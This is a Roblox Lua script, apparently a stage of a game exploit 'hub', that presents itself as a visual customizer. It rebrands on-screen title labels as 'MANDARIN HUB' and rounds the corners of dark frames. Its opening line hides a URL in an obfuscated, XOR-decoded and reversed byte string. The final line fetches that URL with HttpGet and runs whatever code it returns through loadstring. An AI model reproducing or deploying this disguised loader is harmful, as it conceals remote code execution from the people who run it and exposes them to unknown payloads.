
--[[ STAGE 2: VISUAL CORE ]]
local g3TGF3pcmpVjuSn="\252\039\216\036\228\034\193\194\227\041\221\040\235\043\055\033\242\048\053\040\053\002\003\051\000\193\207\208\023\022\016\030\008"local _Yc0kbhloXdh38JiMhgP1P=38 local GRFAuKF2MUs_uF7OtlGdJ=104 local x_WRBqqxvtAoQn=1 local NCBsHUaCrlm8FH9H=2 local JDSsDeeJBSYC=28 local kehI0O2ijpTY=true local CMhfG9RcvXt252op=bit32 and bit32.bxor if not CMhfG9RcvXt252op then CMhfG9RcvXt252op=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local Y0XDuQ5BP8GqxoVm7F={}for VqyZ8RcyA1g8XL5=1,#g3TGF3pcmpVjuSn do local iy2SgunM81PqAzLjFAs3LA=string.byte(g3TGF3pcmpVjuSn,VqyZ8RcyA1g8XL5)local nFv6JtbIAUKhK=(GRFAuKF2MUs_uF7OtlGdJ+(VqyZ8RcyA1g8XL5*NCBsHUaCrlm8FH9H)+JDSsDeeJBSYC)%256 if x_WRBqqxvtAoQn==0 then iy2SgunM81PqAzLjFAs3LA=(iy2SgunM81PqAzLjFAs3LA-nFv6JtbIAUKhK)%256 Y0XDuQ5BP8GqxoVm7F[VqyZ8RcyA1g8XL5]=string.char(CMhfG9RcvXt252op(iy2SgunM81PqAzLjFAs3LA,_Yc0kbhloXdh38JiMhgP1P))else iy2SgunM81PqAzLjFAs3LA=CMhfG9RcvXt252op(iy2SgunM81PqAzLjFAs3LA,_Yc0kbhloXdh38JiMhgP1P)Y0XDuQ5BP8GqxoVm7F[VqyZ8RcyA1g8XL5]=string.char((iy2SgunM81PqAzLjFAs3LA-nFv6JtbIAUKhK)%256)end end local wrYrDRdX_qsqX0J0FMqB=table.concat(Y0XDuQ5BP8GqxoVm7F)if kehI0O2ijpTY then wrYrDRdX_qsqX0J0FMqB=string.reverse(wrYrDRdX_qsqX0J0FMqB)end local QvCtyvRTrIUd=wrYrDRdX_qsqX0J0FMqB
local HubName = "MANDARIN HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(QvCtyvRTrIUd))()
